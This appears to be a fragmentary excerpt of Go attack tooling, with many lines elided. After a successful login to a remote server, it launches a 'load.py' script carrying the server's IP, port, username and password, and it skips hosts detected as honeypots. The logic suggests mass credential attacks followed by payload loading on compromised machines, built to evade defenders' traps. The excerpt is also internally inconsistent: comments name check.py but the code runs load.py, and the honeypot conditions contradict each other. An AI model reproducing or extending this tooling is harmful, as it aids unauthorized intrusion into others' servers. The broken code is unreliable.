...
func logSuccessfulConnection(serverInfo *ServerInfo) {
	...
	// Run check.py in a separate thread
	go runCheckPy(serverInfo)
...
// Run load.py script in a separate thread
func runCheckPy(serverInfo *ServerInfo) {
	cmd := exec.Command("python", "load.py",
		serverInfo.IP,
		serverInfo.Port,
		serverInfo.Username,
		serverInfo.Password)
	...
	cmd.Dir = "/workspaces/codespaces-blank"

	err := cmd.Run()
	if err != nil {
		log.Printf("❌ Error running load.py: %v", err)
	} else {
		log.Printf("✅ load.py executed for %s:%s", serverInfo.IP, serverInfo.Port)
	}
}
	...
	if err == nil {
		...
		if _, exists := successfulIPs[successKey]; !exists {
			...
			if !serverInfo.IsHoneypot {
				...
				if serverInfo.HoneypotScore >= 10 {
					go runCheckPy(serverInfo)
				}
